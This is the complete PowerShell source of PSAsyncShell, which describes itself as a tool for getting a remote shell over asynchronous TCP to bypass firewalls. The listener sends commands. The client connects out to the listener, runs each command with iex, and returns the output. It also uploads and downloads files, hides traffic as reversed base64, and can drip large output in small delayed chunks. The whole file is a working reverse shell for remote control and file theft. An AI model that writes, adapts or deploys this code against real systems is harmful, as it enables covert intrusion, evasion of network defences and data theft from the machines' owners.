#================================#
#   PSAsyncShell by @JoelGMSec   #
#      https://darkbyte.net      #
#================================#

# Design
Set-StrictMode -Off
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") { if ($args[0] -like "-s") {
$Host.UI.RawUI.WindowTitle = "PSAsyncShell - by @JoelGMSec" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }}

# Banner
function Show-Banner {
Write-Host
Write-Host "  ____  ____    _                         ____  _          _ _  " -ForegroundColor Blue
Write-Host " |  _ \/ ___|  / \   ___ _   _ _ __   ___/ ___|| |__   ___| | | " -ForegroundColor Blue
Write-Host " | |_) \___ \ / _ \ / __| | | | '_ \ / __\___ \| '_ \ / _ \ | | " -ForegroundColor Blue
Write-Host " |  __/ ___) / ___ \\__ \ |_| | | | | (__ ___) | | | |  __/ | | " -ForegroundColor Blue
Write-Host " |_|   |____/_/   \_\___/\__, |_| |_|\___|____/|_| |_|\___|_|_| " -ForegroundColor Blue
Write-Host "                         |___/                                  " -ForegroundColor Blue
Write-Host
Write-Host "  ---------------------- by @JoelGMSec -----------------------  " -ForegroundColor Green
Write-Host }

# Help
function Show-Help {
Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you to get a remote shell"
Write-Host "        over asynchronous TCP to bypass firewalls"
Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\PSAsyncShell.ps1 -s -p listen_port" -ForegroundColor Blue 
Write-Host "          Listen for a new connection from the client" -ForegroundColor Green
Write-Host ; Write-Host "        .\PSAsyncShell.ps1 -c server_ip server_port" -ForegroundColor Blue 
Write-Host "          Connect the client to a PSAsyncShell server" -ForegroundColor Green
Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info betwen parts will be sent unencrypted"
Write-Host "          Download & Upload functions don't use MultiPart"
Write-Host }

# Errors
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }

# Variables
$IP = $args[1]
$Port = $args[2]
$Start = "True"
$Chunk = $args[4]
if ($OSVersion -like "*Win*") { $localslash = "\" } else { $localslash = "/" } 

# Functions
function GetChunk {
$text = $args[0] ; $i = 0
while ($i -le ($text.length-$Chunk)){ $text.Substring($i,$Chunk) ; $i += $Chunk }
$text.Substring($i)}

function SendChunk {
try { $writer.WriteLine($args[0])
$writer.Close() ; $tcpConnection.Close()}
catch { $tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
$tcpStream = $tcpConnection.GetStream()
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.WriteLine($args[0])
$writer.Close() ; $tcpConnection.Close()}}

function R64Encoder { 
if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
$base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
$revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }

function R64Decoder {
$base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
$base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
if ($args[0] -eq "-t") { $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) ; $revb64 }
if ($args[0] -eq "-f") { $revb64 = [System.Convert]::FromBase64String($base64) ; [System.IO.File]::WriteAllBytes($args[2], $revb64) }}

# ------------ Server Side ------------ #
if ($args[0] -like "-s") { Show-Banner ; Write-Host "[+] Waiting for new connection..`n" -ForegroundColor Yellow
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::any, "$Port")
$Listener = New-Object System.Net.Sockets.TcpListener $endpoint

# Read command & Send to client
while ($true) { $Listener.Start()
$client = $Listener.AcceptTcpClient()
$stream = $client.GetStream()

if ($Start -eq "True") { $command = R64Encoder -t "[+] PSAsyncShell OK!" }
elseif ($upload -eq "True") { $command = R64Decoder -t $command
$downfile = $command.split()[1] ; $command = R64Encoder -f $downfile ; $upload = "False" }
elseif ($Multi -eq "True") { $command = R64Encoder -t "[+] MultiPart Data OK!" }

else { do { Write-Host -NoNewline "[PSAsyncShell] $path> " -ForegroundColor Blue ; $command = Read-Host

if ($command -like "upload*") { $upload = "True" ; $upfile = $command.split()[2]
if ($command -notlike "*$remoteslash*") { $command = "upload " + $command.split()[1] + " $path" + $remoteslash + $upfile }
if (!$upfile) { Write-Host "[!] Usage: upload local_file remote_file" -ForegroundColor Red ; $command = $null }}

if ($command -like "download*") { $download = "True" ; $downfile = $command.split()[2]
if ($command -notlike "*$remoteslash*") { $command = "download " + $path + $remoteslash + $command.split()[1] + " $downfile" }
if (!$downfile) { Write-Host "[!] Usage: download remote_file local_file" -ForegroundColor Red ; $command = $null }}

if ($command -like "cls") { Clear-Host ; $command = $null }
if ($command -like "clear") { Clear-Host ; $command = $null }
if ($command -like "cd .") { $path = $path ; $command = $null }
if ($command -like "cd ..") { $path = Split-Path $path ; $command = "Set-Location $path" ; Write-Host }
if ($command -like "cd*") { $remotepath = $command.split()[1] ; Write-Host
if ($command -like "*$remoteslash*") { $command = "Set-Location $remotepath" ; $path = $remotepath }

else { $path = $path + $remoteslash + $command.split()[1] ; $command = "Set-Location $path" }}
if ($OSVersion -like "*Win*") { if ($remoteslash -eq "/") { $path = $path.replace("\","/") }}
if ($OSVersion -notlike "*Win*") { if ($remoteslash -eq "\") { $path = $path.replace("/","\") }}
if ($command -eq "exit") { $PSexit = "True" } ; if ($command -eq $null) { Write-Host }}

until ($command -ne $null) ; if ($command) { $command = R64Encoder -t $command }}

$stream.Write([text.Encoding]::Ascii.GetBytes($command), 0, $command.Length)
$client.Close() ; $Listener.Stop()

# Receive command output
Start-Sleep -milliseconds 500
if ($PSexit -eq "True") { Write-Host "[!] Exiting!`n" -ForegroundColor Red ; exit }
$Listener.Start()
$client = $Listener.AcceptTcpClient()
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$data = $reader.ReadLine()

if ($Start -eq "True") { $path = R64Decoder -t $data ; $Start = "False"
$data = $null ; if ($path -like "*\*") { $remoteslash = "\" } else { $remoteslash = "/" }}

elseif ($download -eq "True") { R64Decoder -f $data $downfile
$data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $download = "False" }

elseif ($Multi -eq "True") { if ($(R64Decoder -t $data) -eq "[+] MultiPart Data OK!") { 
$Multi = "False" ; $data = R64Decoder -t $multidata ; $multidata = $null ; Write-Host "`n" }
else { $multidata += $data ; $data = $null ; Write-Host "." -ForegroundColor Yellow -NoNewline }}

else { $data = R64Decoder -t $data }

if (!$data) { if ($Multi -eq "False") { Write-Host }}
if ($data -eq "[+] Ready to upload!") { $data = $null }
if ($data -eq "[+] File uploaded!") { $data = "[+] File uploaded on $path$remoteslash$upfile!`n" }
if ($data -eq "[+] Sending MultiPart Data..") { $data = $null ; $Multi = "True"
Write-Host "[+] Receiving MultiPart Data" -ForegroundColor Yellow -NoNewline }
if ($data) { Write-Host $data -ForegroundColor Yellow }

$client.Close() ; $Listener.Stop()}}

# ------------ Client Side ------------ #
if ($args[0] -like "-c") { while ($true) { $cmd = $null ; $out = $null

# Read command from server
Start-Sleep -milliseconds 500
$tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$cmd = $reader.ReadLine()

if ($upload -eq "True") { R64Decoder -f $cmd $downfile }
else { $cmd = R64Decoder -t $cmd }
if ($cmd -eq "[+] PSAsyncShell OK!") { $Start = "True" }

$reader.Close() ; $tcpConnection.Close()

# Run command & Send to server
$tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
$tcpStream = $tcpConnection.GetStream()
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true

if ($cmd -like "download*") { $out = R64Encoder -f $cmd.split()[1] }
elseif ($cmd -like "upload*") { $downfile = $cmd.split()[2]
$out = R64Encoder -t "[+] Ready to upload!" ; $upload = "True" }

elseif ($upload -eq "True") { $out = R64Encoder -t "[+] File uploaded!" ; $upload = "False" }
elseif ($Start -eq "True") { $out = R64Encoder -t $pwd.Path ; $Start = "False" }
elseif ($Multi -eq "True") { GetChunk $multiout | % { Start-Sleep -milliseconds 1200 ; SendChunk $_ ; SendChunk $_ } ; $Multi = "SendOut" }
elseif ($Multi -eq "SendOut") { $out = R64Encoder -t "[+] MultiPart Data OK!" ; $Multi = "False" ; $multiout = $null }
else { $out = (iex "$cmd") | Out-String
$out = R64Encoder -t $out }

if ($Chunk) { if ($out.length -ge $Chunk) { $multiout = $out ; $Multi = "True"
$out = R64Encoder -t "[+] Sending MultiPart Data.." }}

if ($out) { $writer.WriteLine($out) }
$writer.Close() ; $tcpConnection.Close()}}
